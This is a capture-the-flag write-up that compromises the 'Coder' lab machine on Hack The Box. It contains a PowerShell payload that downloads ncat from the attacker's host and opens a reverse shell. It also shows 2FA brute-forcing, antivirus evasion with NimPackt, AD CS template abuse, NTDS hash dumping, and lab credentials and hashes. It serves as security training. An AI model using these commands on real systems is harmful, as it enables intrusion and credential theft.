<html>
 <body>
  <script src="https://www.hackthebox.eu/badge/148108"></script>
 </body>
 </html>


Back to all write-ups: [here](https://repo4chu.github.io/hackthebox/)


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Coder - HackTheBox - WriteUp
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
![image](https://i.imgur.com/Ax606jt.png)
***Coder is a Windows machine that involves obtaining an encoded file and its encrypter via anonymous login on SMB, reverse engineering encrypter.exe to understand how to decrypt the encoded file, access the user's password for the portal, and then use the brute force on 2FA and after that, enumeration of PKI Adminis group and exploration of Active Directory templates.***

**Tools:**
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
smbclient
crackmapexec
DNSpy
Keepass
BurpSuite
evil-winrm
Certify
bloodhound
Certipy
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**TCP Scan:**
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-05-26 02:43:36Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: coder.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-05-26T02:44:39+00:00; +6h24m06s from scanner time.
| ssl-cert: Subject: commonName=dc01.coder.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.coder.htb
| Issuer: commonName=coder-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-25T20:17:15
| Not valid after:  2024-05-24T20:17:15
| MD5:   9992fa2cc2d7cb81fbd2032966349f96
|_SHA-1: 6e239d23a12dea79e7b020f808f558f7955bd088
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
|_ssl-date: 2023-05-26T02:44:40+00:00; +6h24m05s from scanner time.
| ssl-cert: Subject: commonName=default-ssl/organizationName=HTB/stateOrProvinceName=CA/countryName=US
| Issuer: commonName=coder-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-11-04T17:25:43
| Not valid after:  2032-11-01T17:25:43
| MD5:   e5fea439d8356660c2b778e578a1244e
|_SHA-1: 733cf4571caafdaa8ad1e8fb0abc6fec7f932977
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap
| ssl-cert: Subject: commonName=dc01.coder.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.coder.htb
| Issuer: commonName=coder-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-25T20:17:15
| Not valid after:  2024-05-24T20:17:15
| MD5:   9992fa2cc2d7cb81fbd2032966349f96
|_SHA-1: 6e239d23a12dea79e7b020f808f558f7955bd088
|_ssl-date: 2023-05-26T02:44:40+00:00; +6h24m05s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: coder.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-05-26T02:44:39+00:00; +6h24m06s from scanner time.
| ssl-cert: Subject: commonName=dc01.coder.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.coder.htb
| Issuer: commonName=coder-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-25T20:17:15
| Not valid after:  2024-05-24T20:17:15
| MD5:   9992fa2cc2d7cb81fbd2032966349f96
|_SHA-1: 6e239d23a12dea79e7b020f808f558f7955bd088
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: coder.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.coder.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.coder.htb
| Issuer: commonName=coder-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-25T20:17:15
| Not valid after:  2024-05-24T20:17:15
| MD5:   9992fa2cc2d7cb81fbd2032966349f96
|_SHA-1: 6e239d23a12dea79e7b020f808f558f7955bd088
|_ssl-date: 2023-05-26T02:44:40+00:00; +6h24m05s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49689/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
49714/tcp open  msrpc         Microsoft Windows RPC
53696/tcp open  msrpc         Microsoft Windows RPC
57826/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-05-26T02:44:31
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h24m05s, deviation: 0s, median: 6h24m04s

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**UDP Scan:**
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
PORT    STATE SERVICE VERSION
53/udp  open  domain  (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   NBTStat: 
|_    CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
123/udp open  ntp     NTP v3
| ntp-info: 
|_  receive time stamp: 2023-04-02T03:27:47
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-UDP:V=7.93%I=7%D=4/1%Time=64288652%P=x86_64-pc-linux-gnu%r(NBTSt
SF:at,32,"\x80\xf0\x80\x82\0\x01\0\0\0\0\0\0\x20CKAAAAAAAAAAAAAAAAAAAAAAAA
SF:AAAAAA\0\0!\0\x01");

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



First let's add the names discovered in the scan to our /etc/hosts file.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
echo '10.10.11.207   coder.htb dc01.coder.htb' >> /etc/hosts
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

We can see that the SMB server allows login as anonymous:

![Image](https://i.imgur.com/O5sn42y.png)

We use CrackMapExec to do the enumeration and check the permissions we have.

![Image](https://i.imgur.com/d87bSb9.png)


We have read permission on the "Development" directory, so let's access it.


![Image](https://i.imgur.com/UxRzONc.png)

We have a folder called "Migrations":

![Image](https://i.imgur.com/YIcZYvM.png)


In the "Temporary Projects" folder, we have 2 files, a binary (.exe) and an encrypted file (.enc).
Let's save both on our machine.

![Image](https://i.imgur.com/Wu0foij.png)


Now let's open DNSpy to reversing Encryptor.exe

![Image](https://i.imgur.com/9XNGjws.png)

Inside DNSpy, we can see how the encryption is being done and the use of the RijndaelManaged Class

https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.rijndaelmanaged?view=net-7.0

So we can create a script to try to do the opposite process.

In this snippet, we can see that it is based on the timestamp so we have to put this in our script.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
long value = DateTimeOffset.Now.ToUnixTimeSeconds();
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

So let's check it out in smb:

![Image](https://i.imgur.com/HrXXmPO.png)

Now we write our code to decrypt the s.blade.enc file

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
using System;
using System.IO;
using System.Security.Cryptography;

internal class FileDecryptor
{
    public static void Main(string[] args)
    {
        if (args.Length != 1)
        {
            Console.WriteLine("You must provide the name of a file to decrypt");
            return;
        }

        string sourceFile = args[0];
        string destFile = Path.ChangeExtension(sourceFile, ".dec");

        DateTimeOffset dto = new DateTimeOffset(2022, 11, 11, 19, 17, 8, new TimeSpan(-3, 0, 0));
        long value = dto.ToUnixTimeSeconds();
        Random random = new Random(Convert.ToInt32(value));
        byte[] array = new byte[16];
        random.NextBytes(array);
        byte[] array2 = new byte[32];
        random.NextBytes(array2);
        byte[] array3 = DecryptFile(sourceFile, destFile, array2, array);
    }

    private static byte[] DecryptFile(string sourceFile, string destFile, byte[] Key, byte[] IV)
    {
        using Aes aes = Aes.Create();
        aes.Key = Key;
        aes.IV = IV;

        using FileStream stream = new FileStream(destFile, FileMode.Create);
        using ICryptoTransform transform = aes.CreateDecryptor();
        using CryptoStream cryptoStream = new CryptoStream(stream, transform, CryptoStreamMode.Write);
        using FileStream fileStream = new FileStream(sourceFile, FileMode.Open);

        byte[] array = new byte[1024];
        int count;

        try
        {
            while ((count = fileStream.Read(array, 0, array.Length)) != 0)
            {
                cryptoStream.Write(array, 0, count);
            }
        }
        catch (CryptographicException ex)
        {
            Console.WriteLine("Decryption failed: " + ex.Message);
            return null;
        }

        return null;
    }
}

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Now we can build our code

![Image](https://i.imgur.com/P7ZrKWg.png)


Now we can run our code and inform the file to be decrypted.

![Image](https://i.imgur.com/SqGvcxH.png)

Now when listing again, we have the s.blade.dec file, which means our script worked.

![Image](https://i.imgur.com/2x3KX71.png)

Analyzing the output file, we can see that it is a 7z file.

![Image](https://i.imgur.com/la5l6oj.png)

Now let's rename the file from .dec to .7z


![Image](https://i.imgur.com/zG9JEqk.png)

Now we extract the files using 7z.

![Image](https://i.imgur.com/bJe0ATD.png)

With that, we have 2 files obtained, a ".key" file and a "s.blade.kdbx" file, researching this extension, I could see that it was a Keepass file.

![Image](https://i.imgur.com/uh7RXEU.png)

We open the file in Keepass and use the obtained key to unlock the masterkey.


![Image](https://i.imgur.com/dd8AR1O.png)


With full access to Keepass, we can get another subdomain and credentials for it.

![Image](https://i.imgur.com/0Wm77WS.png)

Then we add the subdomain name to our /etc/hosts file.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
echo '10.10.11.207   teamcity-dev.coder.htb' >> /etc/hosts
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

When accessing it via the web, we will have a login page, where we will use the credentials obtained to authenticate.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
s.blade
veh5nUSZFFoqz9CrrhSeuwhA
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


![Image](https://i.imgur.com/RWid5z0.png)

When logging into the application, we are redirected to 2-factor authentication (2FA).

![Image](https://i.imgur.com/LYX0F2j.png)

This 2FA does not have any kind of protection against brute force.
So let's send the request to the Intruder in BurpSuite to perform this task.

![Image](https://i.imgur.com/EJDA3jI.png)

We will use the seclists list:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/usr/share/seclists/Fuzzing/6-digits-000000-999999.txt
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
![Image](https://i.imgur.com/naIwGwb.png)


After a long time... we got 2FA:

![Image](https://i.imgur.com/m5cZGg9.png)

When we complete the authentication steps, we have access to a JetBrains.


![Image](https://i.imgur.com/DKh7XW3.png)


We can execute the task through the "Run" button, and we can consult the Build Log to verify what is being executed.

![Image](https://i.imgur.com/xMKwUoI.png)

It runs a script called "hello_world.ps1", this script is located in the SMB in the teamcity_test_repo folder.

![Image](https://i.imgur.com/A8kKanC.png)

We can connect on SMB directly in explorer to get the files.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
smb://coder.htb/Development
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![Image](https://i.imgur.com/EIlzrbz.png)

Now we copy the entire repository to our machine

![Image](https://i.imgur.com/AZ2XfLX.png)







With the directory cloned, we can see the git logs and also interact with it.

![Image](https://i.imgur.com/gmjh5Un.png)

On the site, when we click on "..." next to Run, we have the option of "run as a personal build" where it allows us to upload a diff file.

Therefore, we can edit the "hello_world.ps1" file so that we can execute commands when the diff is executed.
We will put some commands in the diff file, all these commands will be executed, we will create the C:/temp directory so that we can write ncat.exe that we will download from our machine to create the reverse connection to obtain a shell.


For this we will need to open a webserver on our machine, we will use python:

![Image](https://i.imgur.com/2EwMnXG.png)

Our hello_world.ps1 file:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#Simple repo test for Teamcity pipeline
mkdir C:\temp
Invoke-WebRequest -Uri http://10.10.14.54/other/ncat.exe -outfile C:\temp\ncat.exe
write-host "Hello, World!"
whoami /all
net user /domain
net user e.black /domain
$netcatPath = 'C:\temp\ncat.exe'
$arguments = '-e', 'powershell.exe', '10.10.14.54', '4444'
$process = Start-Process -FilePath $netcatPath -ArgumentList $arguments -NoNewWindow -PassThru
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Now we use git diff to mount our file:

![Image](https://i.imgur.com/twGPjR4.png)

We have our diff file created:

![Image](https://i.imgur.com/8aygM9l.png)

Now we will upload the diff file and start the execution.

![Image](https://i.imgur.com/nIPN2Pi.png)


When we run it, we can see that the code was output in the build log.

![Image](https://i.imgur.com/Y4RNXS8.png)


We receive the connection on our python server:

![Image](https://i.imgur.com/h9YyxAy.png)


In a few moments, we received our shell.


![Image](https://i.imgur.com/jTb9hUe.png)

After some time of enumeration (long time XD) I found a diff file with powershell commands.

![Image](https://i.imgur.com/NNQOhKW.png)
![Image](https://i.imgur.com/UYGLvdV.png)



We remove the (+) signs and send the enc.txt and key.txt files to the C:\temp\ folder

![Image](https://i.imgur.com/kjH4jUL.png)

We can use powershell to get the password of user e.black.
We will use the commands:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
$key = Get-Content ".\key.txt"
$encryptedContent = Get-Content ".\enc.txt" | ConvertTo-SecureString -Key $key
$unsecurePassword = (New-Object PSCredential 0, $encryptedContent).GetNetworkCredential().Password
echo $unsecurePassword
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

With that we have:

![Image](https://i.imgur.com/bT81QdX.png)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
e.black:ypOSJXPqlDOxxbQSfEERy300
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Now we can access via WinRM.

![Image](https://i.imgur.com/E8XN5GH.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
evil-winrm -i 10.10.11.207 -u e.black -p ypOSJXPqlDOxxbQSfEERy300
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

With that, we can get the user flag.

![Image](https://i.imgur.com/u6omv9S.png)

We leave for the path of user Administrator.

When starting the enumeration, I noticed that the user e.black belongs to a group called "PKI Admins"

![Image](https://i.imgur.com/p8hczB4.png)


Searching about this group, we can find links that mention "AD CS", which can be a vector for privilege escalation.

Let's use Bloodhound to analyze the AD and its permissions.
We will use the "All" method and save everything in a zip.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
python3 -m bloodhound -u e.black -p ypOSJXPqlDOxxbQSfEERy300 -d coder.htb -c all -dc dc01.coder.htb -ns 10.10.11.207 --zip
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![Image](https://i.imgur.com/Skiqc0a.png)

To be able to see the results, first, we start neo4j.

![Image](https://i.imgur.com/vJsxaBn.png)


Then we run Bloodhound:

![Image](https://i.imgur.com/gfhL2xX.png)


In bloodhound, we can find the existing templates.

![Image](https://i.imgur.com/zTZRF3V.png)


We will use Certify.exe to interact with these templates.

When we try to use Certify.exe, we can see the existence of an AV.

![Image](https://i.imgur.com/28gUzlG.png)


So let's use NimPackt to obfuscate our Certify.exe

![Image](https://i.imgur.com/X3qlETC.png)



Now we send it back to our target, and run:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Invoke-WebRequest -Uri http://10.10.14.11/CertifyExecAssemblyNimPackt.exe -Outfile Certify.exe
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
We can see that the AV didn't get our binary :)

![Image](https://i.imgur.com/OQx78aT.png)


We use certify to search for vulnerable templates:
![Image](https://i.imgur.com/J7JSB4R.png)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
.\Certify.exe find /vulnerable
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

In this case, it was not possible to find any vulnerable templates :/

But! We can send a new template:

Let's use this ESC1.json template, available on github: 

https://raw.githubusercontent.com/Orange-Cyberdefense/GOAD/4cc6cbc1bdc86a236649d6c1e2c0dbf856bedeb6/ansible/roles/adcs_templates/files/ESC1.json

We added this snippet in ESC1.json, it allows the PKI Admins group to have enroll permissions.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"msPKI-Enrollment-ACL": [
        {
            "AccessString": "1.3.6.1.4.1.311.21.8.16735922.7437492.10570883.2539024.15756463.185.9025784.11813639.2",
            "Group": "CN=PKI Admins,CN=Users,DC=coder,DC=htb"
        }
    ]
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


We upload ESC1.json to the server under the name of chu.json:

![Image](https://i.imgur.com/dw1UIZ7.png)



Now we use the contents of the ESC1.json file to create a new template, we will create one called 'chu'

![image](https://i.imgur.com/oBmTPVh.png)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
New-ADCSTemplate -DisplayName chu -JSON (Get-Content .\chu.json -Raw) -Publish -Identity "CODER\PKI Admins"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


With the template created on the server side, we use certipy to request a certificate with the UPN: Administrator

![Image](https://i.imgur.com/no0iLoZ.png)

We were able to successfully create the certificate, but when trying to authenticate, we got the wrong clock error.

![Image](https://i.imgur.com/Ru3q64l.png)


We use ntpdate to synchronize the clock with AD.

![Image](https://i.imgur.com/t03KPJa.png)

With the correct time, we can authenticate with the certificate and obtain the hash of the Administrator user.

![Image](https://i.imgur.com/oFjT2On.png)


With the Administrator hash we log in with evil-winrm

![Image](https://i.imgur.com/1WeSfRj.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
evil-winrm -i 10.10.11.207 -u administrator -H 807726fcf9f188adc26eeafd7dc16bb7
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


We can get the other hashes with CrackMapExec:

![Image](https://i.imgur.com/YQaQWVr.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
./cme smb 10.10.11.207 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:807726fcf9f188adc26eeafd7dc16bb7 --ntds
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



if i helped you, add + respect at my profile :D
<html>
 <body>
  <script src="https://www.hackthebox.eu/badge/148108"></script>
 </body>
 </html>
 
my references
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.rijndaelmanaged?view=net-7.0
https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4
https://www.prosec-networks.com/en/blog/adcs-privescaas/
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin
https://0xalwayslucky.gitbook.io/cybersecstack/active-directory/adcs-privesc-certificate-templates
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation
https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf
https://systemweakness.com/exploiting-cve-2022-26923-by-abusing-active-directory-certificate-services-adcs-a511023e5366
https://github.com/ly4k/Certipy
https://exploit-notes.hdks.org/exploit/windows/active-directory/ad-cs-pentesting/
https://github.com/Orange-Cyberdefense/GOAD/blob/4cc6cbc1bdc86a236649d6c1e2c0dbf856bedeb6/ansible/roles/adcs_templates/files/ESC1.json
https://hackinglethani.com/ad-certificate-templates/
https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831740(v=ws.11)
https://www.riskinsight-wavestone.com/en/2021/06/microsoft-adcs-abusing-pki-in-active-directory-environment/
https://notes.offsec-journey.com/privilege-escalation/domain-privilege-escalation
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
